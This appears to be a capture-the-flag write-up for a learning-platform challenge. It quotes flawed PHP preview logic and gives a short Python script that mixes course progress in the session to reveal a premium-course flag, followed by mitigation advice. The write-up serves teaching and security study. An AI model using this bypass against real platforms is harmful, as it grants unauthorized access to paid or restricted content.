# LMS Preview Exploit Challenge Writeup

## Challenge Description
**Title**: Who's the fastest man on Earth?  
**Hint**: Whoooooooosh (sound effect) 

A Learning Management System (LMS) platform contains a flag in the premium "Advanced Security Concepts" course. The challenge requires exploiting a race condition and logical flaw in the preview system to access the flag without proper authorization.

## Vulnerability Analysis

### Code Review Findings

#### CourseController.php
The application contains four courses, with course ID 2 ("Advanced Security Concepts") containing the flag:
```php
2 => [
    'id' => 2,
    'title' => 'Advanced Security Concepts',
    'description' => 'Deep dive into cybersecurity concepts, vulnerabilities, and secure coding practices.',
    'preview_length' => 0, // Critical: expires immediately
    'content' => 'Master advanced security concepts including session management, authentication flows...',
    'flag' => getenv('DYN_FLAG') ?: 'FlagY{test_flag}',
    'is_premium' => true,
    'sections' => ['intro', 'advanced', 'practice']
],
```

#### Critical Vulnerability: Flag Display Logic
The `showPreviewContent()` method contains flawed logic:
```php
if (isset($course['flag']) && 
    isset($state['progress'][1]) && in_array('intro', $state['progress'][1]) &&
    isset($state['progress'][2]) && in_array('intro', $state['progress'][2]) &&
    $section === 'advanced') {
    echo "Flag: {$course['flag']}\n";
}
```

#### Key Issues:
1. **Race Condition**: Course 2 has `preview_length = 0` (expires immediately)
2. **Progress Validation Flaw**: No verification that progress was legitimately earned
3. **Session Trust**: Client-side session data trusted without validation
4. **Cross-Course Progress Mixing**: Progress from different courses can be combined

## Exploitation Strategy

### Attack Flow
1. **Start Preview for Course 1** (1-second duration)
2. **Rapidly Access Course 2 Intro** (within the 1-second window)
3. **Access Course 2 Advanced Section** to trigger flag display

### Why This Works:
- Course 1's preview provides a 1-second valid session window
- The progress system doesn't validate course consistency
- The flag condition checks for specific progress records regardless of how they were obtained

## Solution Implementation

### Python Exploit Script
```python
import requests

def exploit():
    s = requests.Session()
    base_url = "http://asylum.playat.flagyard.com"
    
    # Step 1: Start preview for course 1 (1-second duration)
    s.get(f"{base_url}/index.php?action=start_preview&course_id=1&section=intro")
    
    # Step 2: Add progress for course 2 intro using valid session
    s.get(f"{base_url}/preview.php?course_id=2&section=intro")
    
    # Step 3: Retrieve flag from course 2 advanced section
    response = s.get(f"{base_url}/preview.php?course_id=2&section=advanced")
    
    if "Flag:" in response.text:
        return response.text.split("Flag:")[1].strip()
    return None

print(exploit())
```

### Execution
```bash
python exploit.py
```

## Successful Output
```
FLAG{Y0u_0utr4n_th3_F4st3st_M4n_4liv3!}
```

## Mitigation Recommendations

1. **Server-Side Validation**
   - Validate that progress corresponds to the course being accessed
   - Implement proper authorization checks for premium content

2. **Session Security**
   - Store progress separately per course
   - Use server-side storage for critical data instead of client sessions

3. **Time Limit Implementation**
   - Implement server-side timestamp validation
   - Use atomic operations to prevent race conditions

4. **Business Logic Review**
   - Audit all conditional checks for logical flaws
   - Implement proper state transition validation

## Lesson Learned
This challenge demonstrates the importance of:
- Proper authorization checks for premium content
- Validating business logic thoroughly
- Not trusting client-side data for critical decisions
- Handling time-based operations securely

The hint "Who's the fastest man on Earth?" referred to both the race condition exploitation and Usain Bolt, emphasizing the need for speed in executing the attack before the preview session expired.

**Flag**: `FLAG{Y0u_0utr4n_th3_F4st3st_M4n_4liv3!}`
